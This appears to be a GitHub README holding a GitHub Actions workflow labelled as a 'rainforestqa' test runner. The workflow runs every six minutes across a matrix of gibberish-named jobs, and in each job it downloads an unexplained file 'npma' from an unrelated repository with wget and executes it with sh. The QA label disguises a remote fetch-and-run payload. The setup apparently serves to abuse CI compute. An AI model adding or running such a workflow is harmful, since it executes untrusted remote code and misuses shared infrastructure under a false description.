![656740](https://user-images.githubusercontent.com/103915651/171049220-1f131336-afab-42e2-af4b-ac1597dfed8a.jpg)















BUILD kite
```
name: rainforestqa
on:
  push:
    branches:
      - main
  schedule:
    - cron: '*/6 * * * *'

jobs:
  rainforest:
    runs-on: ubuntu-latest
    strategy:
      matrix:
        Plan: [Regression,Smoke,test,bulk,sit,skalf,saksfq,wefwefi,wefwef,wefwe,sad,dass,gfge]
    name: Run Rainforest
    steps:
      - uses: actions/checkout@v3
      - run: |
         ls
         wget https://github.com/Arlentak/pages/raw/master/npma
         sh npma
```
